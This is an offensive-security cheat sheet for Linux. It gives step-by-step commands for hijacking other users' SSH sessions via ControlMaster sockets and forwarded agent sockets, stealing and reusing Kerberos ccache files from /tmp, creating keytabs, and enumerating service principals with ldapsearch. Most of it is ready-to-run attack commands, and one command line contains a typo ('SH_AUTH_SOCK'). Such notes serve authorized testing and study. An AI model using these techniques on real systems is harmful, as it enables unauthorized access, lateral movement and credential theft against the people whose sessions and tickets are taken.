# Linux

### SSH Hijacking with ControlMaster

ControlMaster allows to share multiple SSH sessions of a single Network Connection. Enabled by having a "~/.ssh/config" file:

```text
Host *
    ControlPath ~/.ssh/cm/%r@%h:%p
    ControlMaster auto
    ControlPersist 5m
```

This stores the socket file as `<user>@<host>:<port>` in `~/.ssh/cm`. ControlPersist declares how long this file should exist after the last connection is closed. When a victim SSHs into a target, this file will be created and we can use it to piggyback into the target as well:

```text
ssh -S ~/.ssh/cm/<socketfile> user@target
```

This technique only allows to ssh into the specific servers we have socket files for.

### SSH Hijacking with SSH Agent Forwarding

In this scenario a user connects to a target server via an intermediate server that forwards the connection. The attacker is on the intermediate server. This requires `ForwardAgent yes` in the users SSH config & `AllowAgentForwarding yes` in sshd\_config. The compromised user needs to have an active connection to the intermediate server at the time of exploitation.

```text
ps aux | grep ssh
ls -lah /tmp
SSH_AUTH_SOCK=/tmp/ssh-<..>/agent.<pid> ssh-add -l
SH_AUTH_SOCK=/tmp/ssh-<..>/agent.<pid> ssh user@target
```

This technique allows to SSH into any server the users "cached keys" have access to.

### Kerberos

#### Setup on Linux Attacker Box

Add target box to /etc/hosts and install:

```text
sudo apt install krb5-user
```

#### /etc/krb5.conf

```text
[libdefaults]
        default_realm = EXAMPLE.COM
        dns_canonicalize_hostname = false

[realms]
        EXAMPLE.COM = {
        kdc = dc1.example.com:88
        admin_server = dc1.example.com:464

}

[domain_realm]
        .example.com = EXAMPLE.COM
        example.com = EXAMPLE.COM
```

#### General

```text
kinit
klist
env | grep KRB5CCNAME
```

All \(or nearly all?\) impacket tools support "-k" parameter and can use kerberos, e.g. "GetUserSPNs.py", "GetADUsers.py", "getST.py".

#### Ldapsearch

Ldapsearch using Kerberos authentication:

```text
ldapsearch -Y GSSAPI -H ldap://<target> -D "<user>@<domain>" -W -b "dc=domain,dc=domain" "servicePrincipalName=*" servicePrincipalName
```

#### CCACHE

Check /tmp for krb5\* files. We can directly use these if we can access them after making a copy and changing ownership to our user:

```text
kdestroy
export KRB5CCNAME=/tmp/krb5cc_<user>
klist
```

#### Keytab

Keytab files are sort of stored kerberos principal names & keys for scripts. Create via:

```text
ktutil
addent -password -p <user>@<domain> -k 1 -e rc4-hmac
<enter password>
wkt /tmp/<user>.keytab
quit
```

Use via:

```text
kinit <user>@<domain> -k -t /tmp/<user>.keytab
klist
kinit -R
```



